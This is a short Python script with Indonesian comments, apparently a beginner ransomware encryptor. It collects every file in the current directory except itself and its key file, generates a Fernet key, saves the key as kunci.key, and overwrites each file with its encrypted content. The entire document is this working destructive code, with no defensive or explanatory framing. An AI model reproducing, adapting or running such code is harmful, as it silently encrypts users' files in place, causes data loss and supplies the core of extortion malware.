# import library

import os
from cryptography.fernet import Fernet

# inisialisasi file

files = []

for  file in os.listdir():
	if file == "kiw.py" or file == "kunci.key":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("kunci.key", "wb") as kunci:
	kunci.write(key)

for file in files:
	with open(file, "rb") as batu:
		content = batu.read()
	content_enkripsi = Fernet(key).encrypt(content)
	with open(file, "wb") as batu:
		batu.write(content_enkripsi)
